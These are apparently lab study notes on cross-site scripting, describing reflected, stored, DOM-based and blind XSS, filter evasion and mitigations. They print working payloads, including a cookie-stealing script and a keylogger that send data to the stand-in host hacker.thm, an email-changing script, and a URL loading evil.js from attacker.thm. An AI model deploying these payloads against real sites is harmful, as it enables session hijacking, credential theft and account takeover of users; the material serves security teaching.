# Cross-Site Scripting (XSS)

- Overview

XSS is a security vulnerability where malicious JavaScript code is injected into a website and executed in a user's browser. This allows attackers to access session tokens, manipulate content, or perform actions on behalf of users.

## XSS Payloads and Their Intentions

- Proof of Concept

Simple payload to display an alert, confirming XSS is possible:

```
<script>alert('XSS');</script>
```

- Session Stealing

Sends cookies to an attacker-controlled URL, allowing them to hijack sessions:

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

- Key Logger

Captures keystrokes and sends them to the attacker:

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
```

- Business Logic Manipulation

Executes site-specific JavaScript functions, like changing an email address:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## Types of XSS Attacks

- Reflected XSS

Occurs when data is reflected back to the user directly from a request. Attackers trick users into clicking a link with a malicious payload in the URL.

Example:

```
https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>
```

- Stored XSS

Malicious scripts are saved on the server, often in a database (e.g., in comments). Every visitor to the affected page executes the script.

Potential Impact: Stolen session cookies, user redirection, and manipulation of user actions.

- DOM-Based XSS

Code executes based on client-side DOM manipulation, without server involvement. This typically happens with elements like window.location.hash that can be altered by the attacker.
Example Scenario:

If window.location.hash is used without sanitization, an attacker can inject JavaScript directly into the webpage.

- Blind XSS

Payloads are stored, but the attacker doesnâ€™t immediately see the result. This is often used in contact forms or support tickets, where an unsuspecting staff member may later execute the malicious script.

Testing: Blind XSS can be monitored using HTTP loggers like XSS Hunter.

## Perfecting XSS Payloads

Crafting XSS payloads often requires testing and adapting to bypass filters. Techniques include:

- Using alternative encoding for characters.
- Splitting strings or injecting code in stages to bypass filters.
- Bypassing filters using obfuscation techniques to avoid detection.

## Mitigation

To prevent XSS:

- Sanitize inputs and encode outputs.
- Use Content Security Policy (CSP) headers to restrict sources of executable scripts.
- Validate user inputs rigorously, especially for fields that allow HTML or JavaScript input.
